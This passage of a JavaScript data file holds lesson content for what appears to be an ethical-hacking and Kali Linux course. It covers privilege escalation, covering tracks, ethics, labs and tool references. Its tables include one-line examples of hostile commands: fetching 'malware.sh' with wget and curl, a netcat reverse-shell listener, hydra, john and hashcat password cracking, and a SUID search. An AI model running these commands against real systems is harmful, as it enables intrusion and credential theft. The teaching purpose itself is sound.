                                            <br>Example: Modifying startup scripts or creating new user accounts to automatically grant access upon reboot.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Privilege Escalation</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Type</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Horizontal Privilege Escalation</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Gaining access to another user account with the same privilege level but different resources or permissions.
                                            <br>Example: Moving between compromised user accounts without increasing privileges.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Vertical Privilege Escalation</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Gaining access to higher privileges, such as from a standard user to an administrator or root user.
                                            <br>Example: Exploiting a vulnerability to escalate from a normal user account to root or admin privileges.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Covering Tracks</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Technique</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Log Manipulation</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Attackers often modify or delete log files to hide their activities.
                                            <br>Example: Deleting logs in /var/log/ on Linux systems or clearing the event logs in Windows to remove traces of malicious activity.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Rootkit Installation</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            A rootkit is malicious software designed to hide the attacker's presence on a system by subverting system functions.
                                            <br>Example: Installing a rootkit to hide processes, files, or network connections from detection by security tools.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                    
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-4",
                title: 'Module 4: Advanced Topics, Ethical and Legal Considerations, Practice and Labs, Staying Updated',
                icon: Terminal,
                sections: [
                    {
                        title: 'Section 1: Advanced Topics',
                        content: `
                            <h4 class="font-bold">Custom Scripting</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Language</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Bash Scripting</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            A command-line interface used in many Linux systems to automate tasks.
                                            <br>Example: Writing a script to automate network reconnaissance or scan IP addresses for open ports.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Python Scripting</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            A versatile language commonly used for developing penetration testing tools.
                                            <br>Example: Creating a Python tool that automates vulnerability scanning or executes basic SQL injection tests.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Advanced Exploitation</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Zero-Day Vulnerabilities</h5>
                                <p>Unpatched, previously unknown flaws in software or hardware. Exploiting these vulnerabilities can bypass security defenses.</p>
                                <p class="mt-2">Example: Attacking an unpatched vulnerability in a popular web application to gain unauthorized access or execute malicious code.</p>
                            </div>
            
                            <h4 class="font-bold">Forensics</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Volatility</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            A framework for analyzing memory dumps from compromised systems.
                                            <br>Example: Using Volatility to analyze memory dumps and identify running processes or network connections involved in an attack.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Red Team vs. Blue Team</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Team</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Role & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Red Team</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Simulates advanced attacks like APTs.
                                            <br>Example: Using phishing emails to gain access to network credentials.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Blue Team</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Focuses on defending against attacks.
                                            <br>Example: Setting up intrusion detection systems (IDS) and analyzing logs to detect unusual activities.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 2: Ethical and Legal Considerations',
                        content: `
                            <h4 class="font-bold">Ethical Hacking</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Importance of Ethics</h5>
                                <p>Ethical hackers adhere to a code of conduct, ensuring that their actions do not harm systems or organizations.</p>
                                <p class="mt-2">Example: Ethical hackers only perform penetration testing on systems for which they have explicit permission, and do not exploit vulnerabilities for personal gain.</p>
                            </div>
            
                            <h4 class="font-bold">Legal Boundaries</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Understanding Laws and Obtaining Authorization</h5>
                                <p>Laws like the Computer Fraud and Abuse Act (CFAA) in the U.S. make unauthorized access to systems illegal.</p>
                                <p class="mt-2">Example: Before conducting penetration testing, a hacker must obtain written consent that outlines the scope and limitations of their actions.</p>
                            </div>
            
                            <h4 class="font-bold">Certifications</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Certification</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">OSCP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A highly regarded certification that requires candidates to perform real-world penetration tests in a controlled environment.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">CEH</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A certification validating a hacker's knowledge of penetration testing tools, techniques, and methodologies.</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 3: Practice and Labs',
                        content: `
                            <h4 class="font-bold">Lab Environment</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">VM Setup</h5>
                                <p>Virtual machines provide isolated environments where users can safely test tools and exploit vulnerabilities.</p>
                                <p class="mt-2">Example: Using VMware or VirtualBox to create a lab environment for penetration testing.</p>
                            </div>
                    
                            <h4 class="font-bold">Practice Platforms</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Platform</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Hack The Box (HTB)</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">An online platform with a variety of virtual machines that offer specific challenges and vulnerabilities to exploit, ideal for hands-on experience.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">TryHackMe</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Offers interactive cybersecurity labs and challenges, catering to both beginners and advanced users with guided tutorials and self-paced exercises.</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Real-World Scenarios</h4>
                            <div class="mb-6">
                                <p>Simulating real-world attacks and defenses through CTF challenges or other practice environments helps build practical experience.</p>
                                <p class="mt-2">Example: Participating in a CTF competition, where teams work to exploit vulnerabilities and capture flags to gain points.</p>
                            </div>
                        `
                    },
                    {
                        title: 'Section 4: Staying Updated',
                        content: `
                            <h4 class="font-bold">Kali Linux Updates</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Regularly Update the OS and Tools</h5>
                                <p>Updating Kali Linux ensures the latest tools and security patches are applied.</p>
                                <p class="mt-2">Command: sudo apt update && sudo apt upgrade to keep your system up to date.</p>
                            </div>
                    
                            <h4 class="font-bold">Cybersecurity News</h4>
                            <div class="mb-6">
                                <p>Staying informed about the latest cybersecurity vulnerabilities and trends is crucial to maintaining relevant skills.</p>
                                <p class="mt-2">Example: Subscribe to cybersecurity news outlets like The Hacker News, Dark Reading, or KrebsOnSecurity to stay updated on exploits and emerging attack trends.</p>
                            </div>
                    
                            <h4 class="font-bold">Community Involvement</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Type</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Forums</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Engage in online forums like Reddit's /r/netsec, StackExchange, or BlackHat, where professionals discuss cybersecurity trends, tools, and techniques.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">CTF Competitions</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Take part in Capture The Flag (CTF) events to practice and refine hacking skills in a controlled environment while competing against others.</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }                    
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            }
        ]
    },
    {
        id: "kali-linux-basics",
        title: "Introduction to Kali Linux, Setup, Linux Basics, and Tools ",
        chapters: [
            {
                id: "module-5",
                title: 'Essential Commands Reference',
                sections: [
                    {
                        title: 'Basic Linux Commands',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Command</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">ls</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Lists files and directories in the current directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">cd [directory]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Changes to the specified directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">pwd</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Displays the current working directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">cp [source] [destination]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Copies a file or directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">mv [source] [destination]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Moves or renames a file or directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">rm [file]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Removes a file</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">mkdir [directory]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Creates a new directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">cat [file]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Displays the contents of a file</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">nano [file]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Edits a file using the nano text editor</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Network and Reconnaissance Commands',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Command</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">ifconfig</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Displays network interface configuration</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">ip a</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Shows IP addresses and network interface details</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">ping [target]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Sends ICMP echo requests to a target to check connectivity</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">netstat</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Displays network connections, routing tables, and interface statistics</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">nmap [target]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Scans for open ports and services on a network<br>Example: nmap -sS [target IP] (TCP SYN scan)</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">traceroute [target]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Traces the route packets take to reach a target</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">whois [domain]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Retrieves domain registration details</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-6",
                title: 'Advanced Security Tools Reference',
                sections: [
                    {
                        title: 'Network Scanning and Enumeration Tools',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">nikto</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Web server scanner to find vulnerabilities
                                            <br><span class="font-mono">Example: nikto -h http://target.com</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">dirb</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Web directory scanner to brute-force directories and files
                                            <br><span class="font-mono">Example: dirb http://target.com /usr/share/dirb/wordlists/common.txt</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">gobuster</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Directory and file brute-forcing tool for web applications
                                            <br><span class="font-mono">Example: gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">theharvester</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Information gathering tool for emails, subdomains, and more
                                            <br><span class="font-mono">Example: theharvester -d target.com -b google</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">dnsrecon</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Performs DNS enumeration
                                            <br><span class="font-mono">Example: dnsrecon -d target.com -t std</span>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Exploitation Tools',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">msfconsole</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Main console for Metasploit Framework
                                            <br><span class="font-mono">Example: msfconsole -q</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">searchsploit</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Search the Exploit-DB for known vulnerabilities
                                            <br><span class="font-mono">Example: searchsploit apache</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">hydra</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Password-cracking tool for various protocols
                                            <br><span class="font-mono">Example: hydra -l admin -P /path/to/wordlist.txt ssh://target.com</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">aircrack-ng</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Suite of tools to crack WEP and WPA-PSK keys
                                            <br><span class="font-mono">Example: airmon-ng start wlan0</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">john</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            John the Ripper for password cracking
                                            <br><span class="font-mono">Example: john --wordlist=passwords.txt hashfile.txt</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">hashcat</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            High-performance password cracker using GPUs
                                            <br><span class="font-mono">Example: hashcat -m 0 -a 0 hashfile.txt wordlist.txt</span>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-7",
                title: 'Post-Exploitation and Privilege Escalation Reference',
                sections: [
                    {
                        title: 'Post-Exploitation and Persistence Tools',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">netcat (nc)</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Versatile networking tool for creating reverse shells and network connections
                                            <br><span class="font-mono">Example: nc -lvp 4444</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">wget</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Download files from the internet
                                            <br><span class="font-mono">Example: wget http://example.com/malware.sh</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">curl</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Transfers data from or to a server
                                            <br><span class="font-mono">Example: curl -O http://example.com/malware.sh</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">setool</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A post-exploitation tool for Windows systems used for privilege escalation</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">metasploit</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Used to run exploits, post-exploitation, and exploit scripts</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">cron</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Used for automating tasks and maintaining persistence
                                            <br><span class="font-mono">Example: crontab -e</span>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Privilege Escalation',
                        content: `
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">sudo</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Executes commands with superuser privileges
                                            <br><span class="font-mono">Example: sudo su</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">sudo -l</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Lists the commands a user is allowed to run with sudo privileges</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">find</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Search for files and directories, useful for privilege escalation
                                            <br><span class="font-mono">Example: find / -type f -perm -4000</span>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b font-mono">linpeas</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A script used for identifying potential privilege escalation vectors on Linux</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 font-mono">linuxprivchecker.py</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A script that searches for possible privilege escalation vulnerabilities on Linux systems</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            }
        ]
    }

]